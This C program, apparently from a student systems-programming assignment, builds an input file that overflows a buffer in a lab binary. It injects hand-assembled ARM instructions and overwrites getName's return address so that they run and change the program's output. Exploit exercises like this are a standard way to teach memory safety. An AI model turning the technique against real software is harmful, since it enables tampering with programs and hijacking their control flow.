/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Ishaan Javali and Jack Zhang                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


/* 
main does not receive any parameters or input from stdin or 
other streams. It does not write to stdout. It uses fprintf 
to write 56 bytes to a file called dataAplus and returns 0.
 */
int main() {
    FILE *psFile;
    unsigned int movInstr, movAddr, movA;
    unsigned int movBranchInstr, movReadStringCallAddr;
    unsigned int branchMachineCode;
    unsigned int strInstr1, strInstr2;
    unsigned int strOffset1, strOffset2, strOffset3, strOffset4;
    unsigned int strbInstr, adrInstr, bInstr;
    psFile = fopen("dataAplus", "w");
    
    /* 4 bytes */
    fprintf(psFile, "I&J");
    fprintf(psFile, "%c", '\0'); 

    movInstr = MiniAssembler_mov(0, '+');
    adrInstr = MiniAssembler_adr(1, 0x420044, 0x420060);
    strbInstr = MiniAssembler_strb(0, 1);

    /* w0 contains 0x400938, address of "What" in .rodata */
    /* movAddr = MiniAssembler_adr(0, 0x400938, 0x420068); */
    /* movAddr = MiniAssembler_mov(0, 0x400938); */
    /* w1 contains the letter A and null bytes */
    movA = MiniAssembler_mov(1, 0x41000000);
    strInstr1 = MiniAssembler_strb(1, 0);

    /* 0x400810 is the instruction where we branch to 
     readString inside the getName function. replace
     it with a branch to the first printf in main */
    branchMachineCode = MiniAssembler_b(0x400864, 0x400810);
    /* 0010 1010 1010 1001 1001 1001 */
    movBranchInstr = MiniAssembler_mov(0, branchMachineCode);
    /* movReadStringCallAddr = MiniAssembler_adr(1, 0x400810, 0x42007b); */
    movReadStringCallAddr = MiniAssembler_mov(1, 0x400810);
    strInstr2 = MiniAssembler_strb(0, 1);

    bInstr = MiniAssembler_b(0x400804, 0x420084);

    /* Write machine code instructions to input file */
    fwrite(&movInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&adrInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&strbInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&movAddr, sizeof(unsigned int), 1, psFile);
    fwrite(&movA, sizeof(unsigned int), 1, psFile);
    fwrite(&strInstr1, sizeof(unsigned int), 1, psFile);
    fwrite(&branchMachineCode, sizeof(unsigned int), 1, psFile);
    fwrite(&movBranchInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&movReadStringCallAddr, sizeof(unsigned int), 1, psFile);
    fwrite(&strInstr2, sizeof(unsigned int), 1, psFile);
    fwrite(&bInstr, sizeof(unsigned int), 1, psFile);
     

    /* We want to replace getName's return address
     with 0x42005C (address in BSS section where 
     machine code instructions begin*/
    fprintf(psFile, "%c", 0x5C);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x42);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);

    /* Close the file */
    fclose(psFile);
    return 0;
}